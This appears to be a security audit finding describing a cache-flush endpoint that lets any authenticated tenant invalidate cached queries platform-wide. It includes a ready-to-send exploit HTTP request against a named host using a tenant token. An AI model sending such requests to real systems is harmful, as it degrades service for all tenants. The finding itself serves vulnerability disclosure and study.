diagnosis: ModelCachePurgeView executes cacheops invalidate_model on a model name supplied via URL path. With only basic authentication required, any platform customer can flush cached queries for heavy database models system-wide, causing severe database load spikes and degrading performance for all tenants.
exploit_request:
POST /api/cache/models/CustomerAccount/flush/ HTTP/1.1
Host: crm-cluster.datacenter.io
Authorization: Bearer tenant_b_token
Content-Length: 0
